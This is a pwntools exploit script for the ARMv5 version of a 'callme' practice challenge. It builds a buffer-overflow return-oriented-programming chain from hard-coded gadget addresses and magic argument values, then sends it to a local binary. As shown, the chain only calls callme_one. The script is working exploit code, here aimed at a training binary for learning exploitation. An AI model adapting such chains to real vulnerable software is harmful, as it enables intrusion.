#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('callme_armv5')

# 64 : read
# 84 : ret
gs='''
b *pwnme+84
c
'''

# pop {r3, pc}
g_popr3 = 0x000108dc          
# 0x000108b0 | mov r2, sb;mov r1, r8; move r0,r7; blx r3
g_mov_r2r1_sbr8 = 0x000108b0
#      0x000108c8           f087bde8  pop {r4, r5, r6, r7, r8, sb, sl, pc}
g_pop_r4tor11 = 0x000108c8

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


time.sleep(.5)


io.recvuntil(b"> ")

print(elf.symbols)
callme_one = elf.plt["callme_one"]
callme_two = elf.plt["callme_two"]
callme_three = elf.plt["callme_three"]

log.info(f"{callme_one=:x}")
log.info(f"{callme_two=:x}")
log.info(f"{callme_three=:x}")

offset=0x20

PL=b"A"*offset
PL+=p32(0)              # Pour fp
PL+=p32(g_popr3 )
PL+=p32(callme_one)     # 
PL+=p32(g_pop_r4tor11)
PL+=p32(0)              # Pour r4
PL+=p32(0)              # Pour r5
PL+=p32(0)              # Pour r6
PL+=p32(0xdeadbeef)     # r7
PL+=p32(0xcafebabe)     # r8
PL+=p32(0xd00df00d)     # r9
PL+=p32(0)              # sl
PL+=p32(g_mov_r2r1_sbr8)  # pc
io.sendline(PL)
io.interactive()

